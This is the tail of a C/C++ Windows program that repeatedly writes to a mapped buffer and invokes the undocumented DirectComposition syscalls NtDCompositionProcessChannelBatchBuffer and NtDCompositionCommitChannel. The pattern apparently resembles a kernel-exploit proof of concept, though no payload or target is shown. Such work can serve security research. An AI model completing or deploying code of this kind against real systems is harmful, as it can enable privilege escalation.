                *(_DWORD*)pMappedAddress = 3;
                NtDCompositionProcessChannelBatchBuffer(hChannel3, 16LL, (PDWORD)&flag, (PDWORD)&NumberOfBytesWritten);
                --contador3;
            } while (contador3 > 0);
            ((NTSTATUS(*)(HANDLE, LPDWORD, LPBOOL, BOOL, HANDLE, DWORD64, DWORD64, DWORD))sym_NtDCompositionCommitChannel)(hChannel, (LPDWORD)_out1, (LPBOOL)_out2, 0LL, 0LL, 0, 0, 0);
            Sleep(0xC8u);


        }

        // Liberar recursos
       
    

    Sleep(0x1000u);

    CoUninitialize();

    return 0;
}
